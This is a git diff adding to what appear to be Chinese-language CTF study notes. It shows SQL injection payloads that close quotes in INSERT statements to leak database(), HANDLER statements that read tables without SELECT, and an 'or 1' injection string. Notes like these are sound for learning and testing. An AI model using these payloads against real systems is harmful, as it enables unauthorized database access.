@@ -31,6 +31,24 @@ alter table `words` change `flag` `id` varchar(100);
 
 /?inject=1' or 1 --+
 ```
+##### 2、insert语句
+```
+正常插入语句：
+insert article value('aaa', '111', '111', 'a')
+2、3为文章标题和内容，因为插入语句会自动加上''，因此，得闭合'并增加一个插入点
+```
+```
+sql注入语句：1', (select database()), 'a'), ('1', '1
+插入成功后显示：insert article value('aaa', (select database()), 'a'), ('1','1', '', 'a')
+```
+##### 3、handler语句
+```
+// 此方法可以不需要select语句即可查看表内的内容
+HANDLER `table_name`;
+HANDLER `table_name` READ FIRST;	// 相当于一个指针，指向表的第一个数据
+HANDLER `table_name` CLOSE;
+e.g. [GYCTF2020]Blacklist1
+```
 
 #### 文件上传
 ##### 1、上传文件，发现后台检测了文件内容包含<?，则可以通过一下方法绕过
